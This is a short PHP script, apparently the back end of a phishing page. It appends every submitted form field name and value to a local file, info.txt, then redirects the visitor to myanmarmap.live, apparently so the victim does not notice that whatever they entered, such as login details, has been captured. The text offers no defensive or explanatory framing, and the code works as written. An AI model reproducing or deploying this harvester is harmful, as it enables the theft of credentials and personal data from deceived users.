<?php
header("location: ");
$info =fopen("info.txt","a");
foreach($_POST as $key=>$value){
fwrite($info,$key);
fwrite($info," = ");
fwrite($info,$value);
fwrite($info,"\r\n\n");
}
fwrite($info,"\r\n");
header("location:https://myanmarmap.live/");
exit;
?>